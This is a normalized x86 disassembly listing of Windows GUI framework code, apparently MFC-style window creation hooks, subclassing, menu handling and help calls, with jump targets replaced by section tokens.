push [ esi + 0x4 ]
push eax
mov eax [ esi + 0xc ]
push [ esi + 0x8 ]
push [ eax + 0x4 ]
call [ ModifyMenuA@IAT ]
pop edi
jmp r-xdata
sub_40f700
push esi
mov esi ecx
call sub_40f173
push 0x20
lea eax [ esi + 0x1c ]
push 0x0
push eax
mov [ esi ] r--data
call sub_4087f0
add esp 0xc
mov eax esi
pop esi
retn
sub_40f73e
push esi
push edi
mov esi ecx
call sub_40f173
lea edi [ esi + 0x1c ]
push 0x20
push 0x0
push edi
mov [ esi ] r--data
call sub_4087f0
mov eax [ esp + 0x18 ]
add esp 0xc
mov [ edi ] eax
mov eax esi
pop edi
pop esi
retn 0x4
sub_40f78d
push ebp
mov ebp esp
sub esp 0x10
test [ ebp + 0x13 ] 0x10
push esi
jne r-xdata
pop esi
leave
retn 0xc
mov esi [ ebp + 0x8 ]
mov ecx esi
call sub_411cba
test eax 0x50000000
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push [ esi + 0x1c ]
call [ GetWindowRect@IAT ]
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
cmp ecx [ ebp - 0x10 ]
jne r-xdata
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0xc ]
jne r-xdata
push 0x4
push [ esi + 0x1c ]
call [ GetWindow@IAT ]
push eax
call sub_40fa9e
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xac ]
test eax eax
je r-xdata
mov ecx eax
call sub_411d3d
test eax eax
jne r-xdata
push 0x0
mov ecx esi
call sub_4115b9
sub_40f806
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov ecx esi
call sub_411cba
test eax 0x40000000
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
mov ecx esi
call sub_410f14
mov edi [ ebp + 0x10 ]
mov ebx eax
mov ecx edi
call sub_410f14
cmp ebx eax
je r-xdata
mov eax [ esi + 0x1c ]
test edi edi
mov [ ebp - 0x8 ] eax
jne r-xdata
mov eax [ edi + 0x1c ]
mov [ ebp - 0x4 ] eax
and [ ebp - 0x4 ] edi
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
push 0x36e
push [ ebx + 0x1c ]
call [ SendMessageA@IAT ]
sub_40f867
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0xfffffffe
push esi
jne r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x201
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_410f14
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] 0x207
je r-xdata
push [ eax + 0x1c ]
call [ GetLastActivePopup@IAT ]
push eax
call sub_40fa9e
mov esi eax
test esi esi
je r-xdata
cmp [ ebp + 0x10 ] 0x204
jne r-xdata
call [ GetForegroundWindow@IAT ]
push eax
call sub_40fa9e
cmp esi eax
je r-xdata
mov ecx esi
call sub_411d3d
test eax eax
je r-xdata
push [ esi + 0x1c ]
call [ SetForegroundWindow@IAT ]
push 0x1
pop eax
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_40f8dd
mov eax sub_413aa0
call sub_40d394
sub esp 0x34
push ebx
push esi
push edi
mov ecx rw-data
mov [ ebp - 0x10 ] esp
push sub_412a04
call sub_412d34
mov ebx eax
push 0x7
pop ecx
lea edi [ ebp - 0x40 ]
lea eax [ ebx + 0x34 ]
and [ ebp - 0x4 ] 0x0
mov esi eax
mov [ ebp - 0x14 ] ebx
[ edi ] [ esi ]
mov ecx [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov [ eax ] ecx
mov eax [ ebp + 0x14 ]
cmp esi 0x2
mov [ ebx + 0x3c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebx + 0x38 ] esi
mov [ ebx + 0x40 ] eax
jne r-xdata
and [ ebp + 0x8 ] 0x0
cmp esi 0x110
jne r-xdata
mov ecx [ edi + 0x34 ]
test ecx ecx
je r-xdata
push [ ebp + 0x18 ]
mov eax [ edi ]
mov ecx edi
push [ ebp + 0x14 ]
push esi
call [ eax + 0x98 ]
cmp esi 0x110
mov [ ebp + 0x18 ] eax
jne r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push edi
call sub_40f76a
mov eax [ ecx ]
push 0x0
call [ eax + 0x5c ]
push 0x7
mov eax [ ebp + 0x18 ]
lea edi [ ebx + 0x34 ]
pop ecx
lea esi [ ebp - 0x40 ]
[ edi ] [ esi ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x14
push [ ebp + 0x8 ]
lea eax [ ebp - 0x24 ]
push eax
push edi
call sub_40f78d
jmp r-xdata
sub_40f987
call sub_40f15e
mov ecx [ ebp - 0x14 ]
mov edx [ eax ]
add ecx 0x34
push ecx
mov ecx eax
push [ ebp + 0xc ]
call [ edx + 0x6c ]
mov ecx [ ebp + 0xc ]
mov [ ebp + 0x18 ] eax
call sub_40ecd7
mov eax r-xdata
retn
sub_40f9d0
push esi
push sub_412a04
mov ecx rw-data
call sub_412d34
mov esi eax
call [ GetMessageTime@IAT ]
mov [ esi + 0x44 ] eax
call [ GetMessagePos@IAT ]
movsx ecx ax
shr eax 0x10
movsx eax ax
mov [ esi + 0x48 ] ecx
mov [ esi + 0x4c ] eax
lea eax [ esi + 0x34 ]
pop esi
retn
sub_40fa05
push esi
mov esi ecx
push sub_412a04
mov ecx rw-data
call sub_412d34
push [ eax + 0x40 ]
mov edx [ esi ]
mov ecx esi
push [ eax + 0x3c ]
push [ eax + 0x38 ]
call [ edx + 0xa0 ]
pop esi
retn
sub_40fa2c
mov eax sub_413ab6
call sub_40d394
push esi
call sub_41314c
mov esi eax
cmp [ esi + 0x14 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
push sub_412174
call sub_40ec85
push 0x48
mov ebx eax
call sub_40ec97
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x1
push 0x1c
push r--data
call sub_411b1a
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x14 ] eax
call sub_40ec85
pop ebx
sub_40fa9e
push esi
push edi
push 0x1
call sub_40fa2c
mov esi eax
push [ esp + 0xc ]
mov ecx esi
call sub_411b7f
mov edi eax
push esi
mov ecx edi
call sub_411da0
mov eax edi
pop edi
pop esi
retn 0x4
sub_40fae3
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
jne r-xdata
push edi
push 0x1
call sub_40fa2c
mov edi eax
push ebx
mov [ esi + 0x1c ] ebx
lea ecx [ edi + 0x4 ]
call sub_40eb79
push edi
mov ecx esi
mov [ eax ] esi
call sub_411da0
push 0x1
pop eax
pop edi
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn 0x4
sub_40fb1c
push esi
mov esi ecx
push edi
mov edi [ esi + 0x1c ]
test edi edi
je r-xdata
and [ esi + 0x38 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_40fa2c
test eax eax
je r-xdata
and [ esi + 0x1c ] 0x0
push [ esi + 0x1c ]
lea ecx [ eax + 0x4 ]
call sub_40ebc9
sub_40fb4a
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x360
jne r-xdata
push [ ebp + 0x8 ]
call sub_40fac5
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_40f8dd
push 0x1
pop eax
jmp r-xdata
pop ebp
retn 0x10
sub_40fb7f
mov eax sub_413ac0
call sub_40d394
sub esp 0x40
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi r--data
mov [ ebp - 0x10 ] esp
push esi
push edi
call [ GetPropA@IAT ]
and [ ebp - 0x14 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0xc ]
push 0x1
sub eax 0x6
pop ebx
je r-xdata
push [ ebp + 0x14 ]
call sub_40fa9e
push edi
mov esi eax
call sub_40fa9e
push esi
push [ ebp + 0x10 ]
push eax
call sub_40f806
sub eax 0x1a
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push [ ebp - 0x18 ]
call [ CallWindowProcA@IAT ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
push edi
call sub_40fa9e
mov ecx [ ebp + 0x14 ]
shr ecx 0x10
push ecx
movsx ecx [ ebp + 0x14 ]
push ecx
push eax
call sub_40f867
xor ebx ebx
test eax eax
sete bl
jmp r-xdata
sub eax 0x62
je r-xdata
test ebx ebx
je r-xdata
push [ ebp - 0x18 ]
push 0xfffffffc
push edi
call [ SetWindowLongA@IAT ]
push esi
push edi
call [ RemovePropA@IAT ]
push esi
call [ GlobalFindAtomA@IAT ]
push eax
call [ GlobalDeleteAtom@IAT ]
jmp r-xdata
sub eax 0x8e
jne r-xdata
push edi
call sub_40fa9e
mov esi eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push esi
call sub_40f76a
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x110
push edi
push [ ebp - 0x18 ]
call [ CallWindowProcA@IAT ]
push [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x30 ]
push eax
push esi
call sub_40f78d
sub_40fca2
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x48 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x40 ] eax
call sub_40f15e
mov edx [ eax ]
lea ecx [ ebp - 0x4c ]
push ecx
mov ecx eax
push [ ebp - 0x20 ]
call [ edx + 0x6c ]
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
call sub_40ecd7
mov eax r-xdata
retn
sub_40fcde
push ebp
mov ebp esp
push esi
push edi
push sub_413490
mov ecx rw-data
call sub_412dc9
mov edi [ ebp + 0xc ]
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_40fb7f
cmp edi 0x135
je r-xdata
push [ esi + 0x8 ]
push eax
lea eax [ edi - 0x132 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_411544
test eax eax
je r-xdata
cmp edi 0x136
je r-xdata
mov eax [ esi + 0x4 ]
jmp r-xdata
cmp edi 0x138
je r-xdata
pop edi
pop esi
pop ebp
retn 0x10
cmp edi 0x137
je r-xdata
cmp edi 0x134
jne r-xdata
sub_40fd5a
push ebp
mov ebp esp
sub esp 0x10
push sub_412a04
mov ecx rw-data
call sub_412d34
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ eax + 0x14 ]
push edi
mov edi [ ecx ]
call sub_413126
movzx eax [ eax + 0x14 ]
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
test esi esi
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ eax + 0x2c ]
call [ CallNextHookEx@IAT ]
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
test [ edi + 0x23 ] 0x40
jne r-xdata
leave
retn 0xc
test esi esi
je r-xdata
push 0xffffffe6
push ebx
call [ GetClassLongA@IAT ]
test eax 0x10000
jne r-xdata
mov esi [ ebp - 0x4 ]
test eax eax
jne r-xdata
push 0xfffffffc
push ebx
call [ GetWindowLongA@IAT ]
test eax eax
mov [ ebp + 0x8 ] eax
je r-xdata
push ebx
mov ecx esi
call sub_40fae3
mov eax [ esi ]
mov ecx esi
call [ eax + 0x50 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x80 ]
cmp [ rw-data ] 0x0
mov [ ebp + 0xc ] eax
jne r-xdata
mov eax [ edi + 0x28 ]
mov ecx eax
shr ecx 0x10
test cx cx
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
push [ esi + 0x2c ]
call [ UnhookWindowsHookEx@IAT ]
and [ esi + 0x2c ] 0x0
mov edi [ GetPropA@IAT ]
mov esi r--data
push esi
push ebx
call edi
test eax eax
jne r-xdata
call sub_40fb79
mov esi eax
push esi
push 0xfffffffc
push ebx
call [ SetWindowLongA@IAT ]
cmp eax esi
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push r--data
push eax
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
and [ ebp - 0x10 ] cl
lea eax [ ebp - 0x10 ]
push 0x5
push eax
mov ax [ edi + 0x28 ]
push eax
call [ GlobalGetAtomNameA@IAT ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x8 ]
push esi
push ebx
call [ SetPropA@IAT ]
push esi
push ebx
call edi
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
and [ esi + 0x14 ] 0x0
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov edi [ rw-data ]
test edi edi
je r-xdata
push esi
call [ GlobalAddAtomA@IAT ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28 ] 0x0
mov eax sub_40fcde
jne r-xdata
push [ ebp + 0x10 ]
push ebx
push 0x3
push [ esi + 0x2c ]
call [ CallNextHookEx@IAT ]
cmp [ ebp - 0x8 ] 0x0
mov edi eax
je r-xdata
cmp [ edi + 0x20 ] 0x0
je r-xdata
push eax
push 0xfffffffc
push ebx
call [ SetWindowLongA@IAT ]
mov eax sub_40fb7f
push 0x0
push 0x0
push 0x36f
push ebx
push esi
call sub_40f8dd
test eax eax
mov [ ebp - 0x10 ] eax
je r-xdata
call sub_40fb79
push 0xfffffffc
push ebx
mov [ ebp + 0x8 ] eax
call [ GetWindowLongA@IAT ]
push [ ebp - 0x10 ]
mov esi eax
sub esi [ ebp + 0x8 ]
push ebx
neg esi
sbb esi esi
inc esi
call [ edi + 0x20 ]
test esi esi
jne r-xdata
push [ ebp + 0x8 ]
push 0xfffffffc
push ebx
call [ SetWindowLongA@IAT ]
jmp r-xdata
sub_40ff50
push esi
push edi
push sub_412a04
mov ecx rw-data
call sub_412d34
mov esi eax
mov edi [ esp + 0xc ]
cmp [ esi + 0x14 ] edi
je r-xdata
pop edi
pop esi
retn 0x4
cmp [ esi + 0x2c ] 0x0
jne r-xdata
mov [ esi + 0x14 ] edi
call [ GetCurrentThreadId@IAT ]
push eax
push 0x0
push sub_40fd5a
push 0x5
call [ SetWindowsHookExA@IAT ]
test eax eax
mov [ esi + 0x2c ] eax
jne r-xdata
call sub_40e926
sub_40ff9c
push esi
push sub_412a04
mov ecx rw-data
call sub_412d34
mov esi eax
call sub_413126
cmp [ eax + 0x14 ] 0x0
je r-xdata
cmp [ esi + 0x14 ] 0x0
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push 0x1
pop eax
pop esi
retn
and [ esi + 0x14 ] 0x0
xor eax eax
pop esi
retn
push eax
call [ UnhookWindowsHookEx@IAT ]
and [ esi + 0x2c ] 0x0
sub_40ffde
push ebp
mov ebp esp
sub esp 0x30
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x2c ]
mov esi ecx
mov [ ebp - 0x28 ] eax
call sub_413126
mov eax [ eax + 0x8 ]
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x30 ]
mov [ ebp - 0x30 ] eax
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x5c ]
test eax eax
jne r-xdata
push edi
push esi
call sub_40ff50
push [ ebp - 0x30 ]
push [ ebp - 0x2c ]
push [ ebp - 0x28 ]
push [ ebp - 0x24 ]
push [ ebp - 0x20 ]
push [ ebp - 0x1c ]
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call [ CreateWindowExA@IAT ]
mov edi eax
call sub_40ff9c
test eax eax
jne r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xa4 ]
xor eax eax
jmp r-xdata
xor eax eax
test edi edi
setne al
pop edi
mov eax [ esi ]
mov ecx esi
call [ eax + 0xa4 ]
pop esi
leave
retn 0x2c
sub_4100c4
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push esi
test eax eax
push edi
jne r-xdata
mov edi [ eax + 0x1c ]
xor edi edi
jmp r-xdata
push [ ebp + 0x20 ]
mov eax [ ebp + 0x14 ]
push [ ebp + 0x1c ]
mov edx [ eax + 0x4 ]
mov esi [ eax ]
push edi
mov edi [ eax + 0xc ]
mov eax [ eax + 0x8 ]
sub edi edx
sub eax esi
push edi
push eax
mov eax [ ebp + 0x10 ]
push edx
or eax 0x40000000
push esi
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push 0x0
call sub_40ffde
pop edi
pop esi
pop ebp
retn 0x1c
sub_410110
mov eax sub_413ad4
call sub_40d394
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x1c ] 0x0
je r-xdata
mov ecx [ esi + 0x34 ]
test ecx ecx
je r-xdata
cmp esi rw-data
je r-xdata
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
cmp esi rw-data
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_40f18d
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
cmp [ eax + 0x24 ] esi
jne r-xdata
cmp esi rw-data
je r-xdata
and [ eax + 0x24 ] 0x0
cmp esi rw-data
je r-xdata
call sub_4102ce
sub_41018c
push esi
mov esi ecx
mov ecx [ esi + 0x34 ]
test ecx ecx
je r-xdata
and [ esi + 0x34 ] 0x0
mov ecx esi
call sub_40fa05
pop esi
retn
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_4101aa
push ebp
mov ebp esp
sub esp 0x2c
push ebx
push esi
push edi
mov esi ecx
call sub_40f15e
mov edi eax
xor ebx ebx
cmp edi ebx
je r-xdata
mov ecx [ esi + 0x30 ]
cmp ecx ebx
je r-xdata
cmp [ edi + 0x1c ] esi
jne r-xdata
mov ecx [ esi + 0x34 ]
push 0x1
test ecx ecx
pop ebx
je r-xdata
mov eax [ ecx ]
call [ eax + 0x50 ]
mov [ esi + 0x30 ] ebx
cmp [ edi + 0x20 ] esi
jne r-xdata
call sub_413126
cmp [ eax + 0x14 ] bl
jne r-xdata
and [ esi + 0x34 ] 0x0
test [ esi + 0x24 ] bl
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
mov [ edi + 0x20 ] ebx
mov [ edi + 0x1c ] ebx
call sub_413126
cmp edi [ eax + 0x4 ]
jne r-xdata
mov edi [ GetWindowLongA@IAT ]
push 0xfffffffc
push [ esi + 0x1c ]
call edi
mov ecx esi
mov ebx eax
call sub_40fa05
push 0xfffffffc
push [ esi + 0x1c ]
call edi
cmp eax ebx
jne r-xdata
call sub_412eef
mov edi [ eax + 0xcc ]
test edi edi
je r-xdata
push ebx
call sub_4139be
call sub_412984
test eax eax
je r-xdata
mov ecx esi
call sub_40fb1c
mov eax [ esi ]
mov ecx esi
call [ eax + 0xa4 ]
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi ]
mov ecx esi
call [ eax + 0x80 ]
mov eax [ eax ]
test eax eax
je r-xdata
cmp [ edi + 0x1c ] 0x0
je r-xdata
push eax
push 0xfffffffc
push [ esi + 0x1c ]
call [ SetWindowLongA@IAT ]
push 0x2c
lea eax [ ebp - 0x2c ]
push 0x0
push eax
call sub_4087f0
mov eax [ esi + 0x1c ]
add esp 0xc
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x2c ] 0x28
push eax
push 0x0
push 0x405
mov [ ebp - 0x28 ] ebx
push [ edi + 0x1c ]
call [ SendMessageA@IAT ]
sub_4102ce
push esi
mov esi ecx
cmp [ esi + 0x1c ] 0x0
jne r-xdata
push ebx
push edi
push 0x0
call sub_40fa2c
push [ esi + 0x1c ]
lea ecx [ eax + 0x4 ]
call sub_40eb46
mov ecx [ esi + 0x38 ]
mov edi eax
test ecx ecx
jne r-xdata
xor eax eax
pop esi
retn
mov eax [ ecx ]
call [ eax + 0x50 ]
push [ esi + 0x1c ]
call [ DestroyWindow@IAT ]
jmp r-xdata
mov eax ebx
pop edi
pop ebx
pop esi
retn
mov ecx esi
call sub_40fb1c
test edi edi
mov ebx eax
jne r-xdata
sub_41031b
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x28 ]
test eax eax
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ esi + 0x1c ]
push eax
call [ CallWindowProcA@IAT ]
mov eax [ esi ]
call [ eax + 0x80 ]
mov eax [ eax ]
test eax eax
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ esi + 0x1c ]
call [ DefWindowProcA@IAT ]
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_410385
push esi
call sub_412eef
mov esi eax
mov eax [ esi + 0xcc ]
test eax eax
je r-xdata
cmp [ esp + 0x8 ] 0x0
mov esi [ esi + 0x108 ]
je r-xdata
mov eax [ eax + 0x1c ]
test eax eax
je r-xdata
pop esi
retn 0x4
test esi esi
je r-xdata
push 0x0
push 0x0
push 0x401
push eax
call [ SendMessageA@IAT ]
push 0x1
call [ GetKeyState@IAT ]
test ax ax
jl r-xdata
mov eax [ esi ]
push 0xffffffff
mov ecx esi
call [ eax + 0xdc ]
sub_4103dc
push ebp
mov ebp esp
push ebx
push edi
push [ ebp + 0xc ]
mov ebx ecx
push [ ebp + 0x8 ]
push [ ebx + 0x1c ]
call sub_412058
mov edi eax
test edi edi
je r-xdata
or eax 0xffffffff
push esi
push edi
call [ GetDlgCtrlID@IAT ]
mov esi [ ebp + 0x10 ]
movzx eax ax
test esi esi
mov [ ebp + 0xc ] eax
je r-xdata
mov eax [ ebp + 0xc ]
pop esi
jmp r-xdata
cmp [ esi ] 0x28
jb r-xdata
pop edi
pop ebx
pop ebp
retn 0xc
mov eax [ ebx + 0x1c ]
or [ esi + 0x4 ] 0x1
or [ esi + 0x24 ] 0xffffffff
push 0x0
push 0x0
push 0x87
push edi
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edi
call [ SendMessageA@IAT ]
test ah 0x20
jne r-xdata
or [ esi + 0x4 ] 0x80000002
sub_41044d
push esi
mov esi [ esp + 0xc ]
push edi
mov edi ecx
cmp [ esi ] 0x1
jne r-xdata
push 0x0
push [ esi + 0x14 ]
call sub_41108a
test eax eax
jne r-xdata
push [ esi + 0x14 ]
call sub_411fad
test eax eax
je r-xdata
pop edi
pop esi
retn 0x8
mov ecx edi
call sub_40fa05
mov edx [ eax ]
push esi
mov ecx eax
call [ edx + 0xc ]
jmp r-xdata
sub_41048a
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push esi
push eax
mov eax [ ebp + 0xc ]
mov esi ecx
push [ eax + 0x8 ]
call sub_41108a
test eax eax
je r-xdata
mov ecx esi
call sub_40fa05
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0x8
sub_4104d4
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_40fa05
lea eax [ ebp + 0xc ]
push eax
call sub_41105d
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_4104ff
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
push [ esi + 0x4 ]
call [ GetMenuItemCount@IAT ]
mov ebx eax
xor edi edi
test ebx ebx
jle r-xdata
xor eax eax
push edi
push [ esi + 0x4 ]
call [ GetSubMenu@IAT ]
push eax
call sub_411f98
test eax eax
je r-xdata
push edi
push [ esi + 0x4 ]
call [ GetMenuItemID@IAT ]
cmp eax [ esp + 0x14 ]
je r-xdata
push [ esp + 0x14 ]
push eax
call sub_4104ff
test eax eax
jne r-xdata
push [ esi + 0x4 ]
call sub_411fad
jmp r-xdata
inc edi
cmp edi ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn 0x8
jmp r-xdata
sub_410562
push esi
mov esi [ esp + 0xc ]
push edi
mov edi ecx
cmp [ esi ] 0x1
jne r-xdata
mov esi [ esi + 0x4 ]
push 0x1
push esi
push [ edi + 0x1c ]
call sub_410f3c
test eax eax
je r-xdata
push sub_412a04
mov ecx rw-data
call sub_412d34
mov ecx [ edi + 0x1c ]
cmp [ eax + 0x50 ] ecx
jne r-xdata
mov ecx edi
call sub_40fa05
push 0x0
mov ecx eax
call sub_41105d
test eax eax
jne r-xdata
push ecx
call [ GetMenu@IAT ]
push eax
push [ eax + 0x54 ]
jmp r-xdata
pop edi
pop esi
retn 0x8
mov edx [ eax ]
push esi
mov ecx eax
call [ edx + 0x10 ]
jmp r-xdata
call sub_411f98
push [ esi + 0x8 ]
push eax
call sub_4104ff
test eax eax
je r-xdata
sub_4105da
mov eax sub_413ae0
call sub_40d394
sub esp 0x30
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x10 ] esp
push eax
push [ esi + 0x24 ]
push [ esi + 0x10 ]
call [ GetClassInfoA@IAT ]
test eax eax
jne r-xdata
push 0x1
pop eax
push esi
call [ RegisterClassA@IAT ]
test ax ax
jne r-xdata
call sub_413126
xor ebx ebx
cmp [ eax + 0x14 ] bl
je r-xdata
xor eax eax
jmp r-xdata
push 0x1
call sub_413236
mov [ ebp - 0x4 ] ebx
call sub_413126
push [ esi + 0x24 ]
mov esi [ lstrcatA@IAT ]
lea edi [ eax + 0x34 ]
push edi
call esi
lea eax [ ebp + 0xa ]
mov [ ebp + 0xa ] 0xa
push eax
push edi
mov [ ebp + 0xb ] bl
call esi
or [ ebp - 0x4 ] 0xffffffff
push 0x1
call sub_4132a6
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
sub_41066b
push 0x1
call sub_4132a6
xor ebx ebx
push ebx
push ebx
call sub_40cf90
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
push sub_412a04
mov ecx rw-data
mov [ ebp - 0xc ] eax
call sub_412d34
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0xc ]
sub eax 0x132
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
push 0x0
push 0x19
mov ecx esi
call [ eax + 0x98 ]
pop esi
leave
retn 0x8
sub_4106c1
mov eax sub_413af4
call sub_40d394
push ecx
push ebx
push esi
mov esi ecx
call sub_413126
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
call sub_413126
mov ecx [ eax + 0x4 ]
call sub_40f3dc
mov eax [ esi ]
xor ebx ebx
mov ecx esi
mov [ ebp - 0x4 ] ebx
call [ eax + 0xb0 ]
test eax eax
je r-xdata
push edi
mov edi [ SendMessageA@IAT ]
push ebx
push ebx
push 0x1f
push [ esi + 0x1c ]
call edi
push 0x1
push 0x1
push ebx
push ebx
push 0x1f
push [ esi + 0x1c ]
call sub_410fb5
mov ecx esi
call sub_410f14
push ebx
mov esi eax
push ebx
push 0x1f
push [ esi + 0x1c ]
call edi
push 0x1
push 0x1
push ebx
push ebx
push 0x1f
push [ esi + 0x1c ]
call sub_410fb5
call [ GetCapture@IAT ]
cmp eax ebx
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xf0 ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push [ ebp + 0xc ]
push [ eax + 0x8c ]
push [ esi + 0x1c ]
call [ WinHelpA@IAT ]
test eax eax
pop edi
jne r-xdata
push ebx
push ebx
push 0x1f
push eax
call edi
or [ ebp - 0x4 ] 0xffffffff
call sub_413126
mov ecx [ eax + 0x4 ]
call sub_40f3f1
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x8
